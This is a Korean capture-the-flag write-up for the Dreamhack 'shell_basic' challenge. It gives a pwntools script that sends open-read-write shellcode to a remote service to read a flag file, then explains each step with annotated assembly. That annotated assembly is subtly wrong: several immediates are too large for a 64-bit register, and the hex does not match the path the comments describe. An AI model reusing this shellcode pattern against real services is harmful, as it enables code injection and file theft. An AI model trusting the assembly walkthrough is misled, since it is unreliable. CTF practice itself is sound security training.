# shell_basic

```python
from pwn import *

p = remote('host1.dreamhack.games', 10499)

# 익스플로잇 환경 설정
context(arch="amd64", os="linux")

# 내용이 나올때까지 기다림
p.recvuntil('shellcode: ')

payload = ""
payload += shellcraft.pushstr("/home/shell_basic/flag_name_is_loooooong")
payload += shellcraft.open("rsp",0,0)
payload += shellcraft.read("rax", "rsp", 36)
payload += shellcraft.write(1, "rsp", 36)

p.sendline(asm(payload)) # 셸코드 어셈블리어로 변환하여 바이너리로 변환
print(p.recv(4096))
```

### **쉘코드의 전체 흐름**

1. pushstr : 플래그 파일 경로를 스택에 저장.
    
    ```nasm
    xor rax, rax                        # rax 레지스터를 0으로 초기화
    mov rbx, 0x6e6f6f6f6f6f6f6e676100   # 경로 문자열의 일부를 rbx에 저장
    push rbx                            # rbx 내용을 스택에 푸시
    mov rbx, 0x656d616e5f656d616e2f     # 경로 문자열의 나머지 부분을 rbx에 저장
    push rbx                            # rbx 내용을 스택에 푸시
    mov rbx, 0x62617369635f656c6c2f68   # 앞부분 경로 "/home/shell_basic/"를 rbx에 저장
    push rbx                            # rbx 내용을 스택에 푸시
    ```
    
2. open : 스택에 저장된 파일 경로를 사용하여 플래그 파일을 엶.
    
    ```nasm
    mov rdi, rsp        # rdi에 스택 포인터(rsp)에 저장된 파일 경로를 복사
    xor esi, esi        # esi(파일 열기 플래그)를 0으로 설정 (읽기 전용)
    xor edx, edx        # edx(파일 모드)를 0으로 설정
    mov eax, 2          # eax에 SYS_open 시스템 호출 번호(2)를 저장
    syscall             # 시스템 호출 실행
    ```
    
3. read : 파일에서 36바이트 데이터를 읽어 스택에 저장.
    
    ```nasm
    mov rdi, rax        # rdi에 파일 디스크립터(rax)를 복사
    mov rsi, rsp        # rsi에 데이터를 저장할 메모리 주소(rsp)를 복사
    mov rdx, 36         # rdx에 읽을 데이터 크기(36바이트)를 설정
    mov eax, 0          # eax에 SYS_read 시스템 호출 번호(0)를 저장
    syscall             # 시스템 호출 실행
    ```
    
4. write : 읽어온 데이터를 표준 출력(콘솔)에 출력.
    
    ```nasm
    mov rdi, 1          # rdi에 파일 디스크립터(1)를 설정
    mov rsi, rsp        # rsi에 출력할 데이터가 저장된 메모리 주소(rsp)를 복사
    mov rdx, 36         # rdx에 출력할 데이터 크기(36바이트)를 설정
    mov eax, 1          # eax에 SYS_write 시스템 호출 번호(1)를 저장
    syscall             # 시스템 호출 실행
    ```